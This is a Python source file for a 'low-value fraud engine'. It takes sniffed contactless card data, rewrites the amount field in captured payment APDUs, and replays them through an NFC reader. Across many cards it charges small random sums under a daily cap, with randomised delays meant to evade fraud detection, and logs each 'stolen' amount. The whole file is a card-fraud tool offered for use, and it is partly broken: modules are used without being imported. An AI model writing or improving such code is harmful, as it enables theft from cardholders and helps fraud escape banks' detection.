import random
import time
from datetime import datetime, timedelta

class LowValueFraudEngineV2:
	def __init__(self, db_file="sniffed_cards.db", maxiprox_device="usb"):
		self.db_file = db_file
		self.device = maxiprox_device
		self.daily_limit_per_card = 5000  # $50.00 in cents
		self.random_delay_range = (10, 120)  # Seconds between transactions

	def _random_amount(self, min_cents=100, max_cents=500):
		"""Generate a random low-value transaction amount."""
		return random.randint(min_cents, max_cents)

	def _random_delay(self):
		"""Generate a realistic delay between transactions."""
		return random.randint(*self.random_delay_range)

	def _is_within_daily_limit(self, card_uid, total_stolen_today):
		"""Check if a card is within its daily fraud limit."""
		return total_stolen_today + self._random_amount() <= self.daily_limit_per_card

	def execute_low_value_fraud(self, cards):
		"""Perform low-value transactions across multiple cards."""
		for card in cards:
			total_stolen_today = card.get("total_stolen_today", 0)
			if not self._is_within_daily_limit(card["uid"], total_stolen_today):
				print(f"Skipping card {card['uid']} (daily limit reached).")
				continue

			amount = self._random_amount()
			self._execute_transaction(card, amount)
			card["total_stolen_today"] += amount
			print(f"Stolen ${amount / 100:.2f} from card {card['uid']}.")

			delay = self._random_delay()
			print(f"Waiting {delay} seconds before next transaction...")
			time.sleep(delay)

	def _execute_transaction(self, card, amount_cents):
		"""Replay a low-value transaction for a single card."""
		apdu_request = self._modify_transaction_amount(card["apdu_request"], amount_cents)
		with nfc.ContactlessFrontend(self.device) as clf:
			response = clf.connect(rdwr={
				"on-connect": lambda tag: tag.exchange(apdu_request),
			})
			self._log_transaction(card["uid"], amount_cents, response)

	def _modify_transaction_amount(self, apdu_request, amount_cents):
		"""Modify the APDU to include the desired transaction amount."""
		apdu = bytes.fromhex(apdu_request)
		amount_bytes = amount_cents.to_bytes(2, "big")  # Amount in cents
		return apdu[:10] + amount_bytes + apdu[12:]

	def _log_transaction(self, card_uid, amount_cents, response):
		"""Log the transaction for auditing and analysis."""
		with open("fraud_log.json", "a") as f:
			log_entry = {
				"timestamp": datetime.now().isoformat(),
				"uid": card_uid,
				"amount_cents": amount_cents,
				"response": response.hex(),
			}
			f.write(json.dumps(log_entry) + "\n")
		print(f"Logged transaction: {log_entry}")
